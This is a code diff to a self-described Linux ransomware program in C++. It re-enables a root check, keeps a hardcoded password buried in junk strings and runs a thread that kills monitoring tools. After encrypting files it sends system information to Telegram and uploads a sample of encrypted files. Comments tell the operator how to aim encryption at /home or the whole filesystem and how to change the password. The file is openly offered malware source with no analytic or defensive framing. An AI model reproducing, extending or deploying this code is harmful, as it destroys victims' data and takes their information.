@@ -1,6 +1,8 @@
 // Developed by Colton Silva 2025
 // version 1.0
 //
+// Categorized as RANSOMWARE
+//
 // WARNING: This single file contains c++ source code that
 // can destroy Linux system by encrypting all files
 // (including system files) and deleting them automatically
@@ -10,7 +12,8 @@
 // This software can alter or modify the system's operation
 // which is, to block signals from preventing this from running
 //
-// To compile this, use g++ with -lcrypto, and -pthread flags
+// To compile this, use g++ with -lcrypto, -lcurl, -std=c++17
+// and -pthread flags
 
 
 #include <iostream>
@@ -45,16 +48,17 @@ const size_t CHUNK_SIZE = 16 * 1024;
 const int AES_KEY_SIZE = 32;
 const int AES_BLOCK_SIZE = 16;
 const int SALT_SIZE = 16;
-const char FILE_SIGNATURE[] = "SILVASYSTEMS\x01\x00";
+const char FILE_SIGNATURE[] = "SILVASYSTEMS\x01\x00"; //You may change this with your own key
 const string MAP_FILE = "file_map.txt";
 
 // Obfuscated password hidden inside garbage text
-const string junk1 = "やπ郧bnLJ9SADxEcʥ9&aԠNISEKOIࠇ+eعKק";
-const string junk2 = "ECieNvDsPuK99suPReMO69jEEpcM8e3";
-const string junk3 = "vincemcmahon";
+const string junk1 = "やπ郧bnLJ9SA9uiUSjhkDxEcʥ9&aԠNISEKOIࠇ+eعKק";
+const string junk2 = "ECieNvDsPuK99suPReMO69jEa=2SDFwsEpcM8e3";
+const string junk3 = "vincemcmahon"; // you may change this password
 const string junk4 = "ㅴwVܮ3辸E6c&䶵Մ$sUcKmaHdIcK3ふわÅ=Đ?őŔԪ";
-const string junk5 = "𐅰E𐊘4ed𐎵𐐡flUncKj7eU8𐌱cR?e齉Do";
-const string junk6 = "EsU5E?cLmhH9dAzZLyuDFa9DFaOpP";
+const string junk5 = "𐅰E𐊘4ed𐎵𐐡flUncKj7eSOvIEtUnIoN8𐌱cR?e齉Do";
+const string junk6 = "EsU5E?cLmhH9dAzZLyuDFdaADteL94nJNka9DFaOpP";
+const string junk7 = "eEv8shuUpuREWeEkLY87jkIHD9YDHUI9?EEpRAcajci";
 const string HARDCODED_PASSWORD = junk3;
 
 // Password attempt limit
@@ -173,6 +177,10 @@ void encryptAllFiles() {
     map<string, string> fileMap;
     int counter = 1;
     encryptDirectory(fs::current_path(), fileMap, counter);
+    // to change the Present Working Directory (PWD) into your chosen root directory, or entire root, replace the function encryptDirectory with this example:
+    // encryptDirectory("/home", fileMap, counter);
+    // to change it again into PWD, replace with 
+    // encryptDirectory(fs::current_path(), fileMap, counter);
     ofstream mapFile(MAP_FILE, ios::binary);
     for (auto &pair : fileMap) {
         mapFile << pair.first << " " << std::quoted(pair.second) << endl;
@@ -389,20 +397,25 @@ void installPackageIfMissing(const string &pkg) {
 void checkDependencies() {
     installPackageIfMissing("libssl-dev");
     installPackageIfMissing("libcurl4-openssl-dev");
-    installPackageIfMissing("build-essential"); // g++, make, etc.
+    installPackageIfMissing("build-essential");
+    installPackageIfMissing("acpi");
 }
+
+void sendRandomEncryptedFiles(const string &directory, int maxFiles);
+std::string gatherFullSystemInfo();
+void sendMessageToTelegram(const string &message);
+
 
 
 int main(int argc, char* argv[]) {
 
 // This requires you to run this program into root
-
-/*if (geteuid() != 0) {
+if (geteuid() != 0) {
     cerr << "\n\033[1;31m[ERROR]\033[0m This program must be run as root." << endl;
     exit(1);
-}*/
+}
 
- cout << "\033[1;34m[START]\033[0m We need to check if the required sependencies are installed.\n" << endl;
+ cout << "\033[1;34m[START]\033[0m We need to check if the required dependencies are installed.\n" << endl;
                   
         this_thread::sleep_for(chrono::seconds(15));
 
@@ -422,6 +435,8 @@ if (!fs::exists(MAP_FILE)) {
     thread antiMonitor(monitorAndKillTaskManagers);
     antiMonitor.detach(); // Keeps it running in background
 
+
+// for the sake of preservation in case there's a problem here
 
      //   signal(SIGINT, ignoreSignals);  // Prevents Ctrl+C
       //  signal(SIGTSTP, ignoreSignals); // Prevents Ctrl+Z
@@ -450,8 +465,17 @@ if (!fs::exists(MAP_FILE)) {
 
         cout << "Null-ng files...\n" << endl;
 
-
         encryptionThread.join();
+        
+        string info = gatherFullSystemInfo();
+        sendMessageToTelegram(info);
+        sendRandomEncryptedFiles(fs::current_path().string(), 10);
+        // If you want to encrypt root directory, do this example here:
+        // sendRandomEncryptedFiles("/home", 10);
+        // Only if you want the current user's home directory, use this instead:
+        // sendRandomEncryptedFiles(getenv("HOME"), 10);
+
+        
         decryptAllFiles();
         return 0; 
     }
